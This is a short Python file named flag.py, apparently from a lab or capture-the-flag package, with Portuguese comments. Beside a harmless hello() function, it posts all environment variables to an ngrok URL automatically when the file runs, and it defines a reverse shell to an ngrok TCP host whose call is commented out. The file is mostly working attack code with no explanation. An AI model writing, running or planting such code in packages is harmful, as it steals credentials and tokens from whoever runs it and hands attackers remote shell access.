# artifact_lab_3_package_89883da3/flag.py
import os
import socket
import subprocess
import requests

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("8.tcp.ngrok.io", 14060))  # Substitua com o seu host e porta do ngrok
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])

def exfiltrate_env_vars():
    env_vars = os.environ
    url = "https://6474-67-205-141-215.ngrok-free.app/log"  # URL ngrok fornecida

    # Enviar as variáveis de ambiente para o servidor
    try:
        response = requests.post(url, data=env_vars)
        print(f"Server responded with status code: {response.status_code}")
    except Exception as e:
        print(f"Failed to exfiltrate environment variables: {e}")

def hello():
    print("Hello, World!")

# Executa a exfiltração de variáveis ao executar o script
exfiltrate_env_vars()

# Opcionalmente, também execute a shell reversa ao executar este script
# reverse_shell()

